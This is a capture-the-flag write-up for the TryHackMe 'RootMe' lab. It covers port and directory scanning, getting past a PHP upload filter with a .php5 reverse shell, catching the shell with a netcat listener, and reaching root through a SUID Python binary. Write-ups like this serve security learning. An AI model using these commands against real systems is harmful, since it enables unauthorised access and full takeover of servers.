# RootMe: Write-up
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web / Privilege Escalation  

---

## Task 1 & 2: Reconnaissance

### Port Scan and Service Detection
```bash
└─$ nmap -sV -p- -T4 <TARGET_IP>
```

**Results:**
- **Port 22:** OpenSSH 8.2p1 (Ubuntu)
- **Port 80:** Apache httpd 2.4.41

### Directory Discovery (GoBuster)
```bash
└─$ gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

**Notable Findings:**
- `/uploads/`: Directory where uploaded files are stored.
- `/<REDACTED_PANEL>/`: Hidden administrative/upload panel.

---

## Task 3: Getting a Shell

### Upload Filter Bypass
The application features a file upload form at `/<REDACTED_PANEL>/`. Direct uploads of `.php` files are blocked by a server-side filter.

**Technique:** Filter Bypass via Alternative Extensions.  
Since the server is configured to execute PHP but only blocks the specific `.php` extension, we can try legacy or alternative extensions like `.php3`, `.php4`, `.php5`, or `.phtml`.

1. **Payload:** PHP Reverse Shell (PentestMonkey).
2. **Rename:** `shell.php` -> `shell.php5`
3. **Upload:** Successfully accepted by the server.

### Triggering the Reverse Shell
1. **Listener:**
   ```bash
   └─$ nc -lvnp 4444
   ```
2. **Execution:** Navigated to `http://<TARGET_IP>/uploads/shell.php5` to trigger the payload.
3. **Connection:** Received callback as `www-data`.

**User Flag:**
```bash
└─$ find / -name user.txt 2>/dev/null
└─$ cat /var/www/user.txt
# THM{[REDACTED]}
```

---

## Task 4: Privilege Escalation

### SUID Enumeration
We searched for binaries with the SUID bit set, which allows a file to be executed with the permissions of the file owner (in this case, root).

```bash
└─$ find / -perm -u=s -type f 2>/dev/null
```

**Critical Finding:**
- `/usr/bin/python` (or `python2.7`)

A SUID Python interpreter is a major security risk, as it allows for arbitrary code execution with elevated privileges.

### Escalation via Python SUID
Using a technique from **GTFOBins**, we can spawn a shell that maintains the SUID's root privileges:

```bash
└─$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Validation:**
```bash
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
*Note: The `euid=0` (Effective UID) confirms we are operating with root privileges.*

**Root Flag:**
```bash
# cat /root/root.txt
# THM{[REDACTED]}
```

---

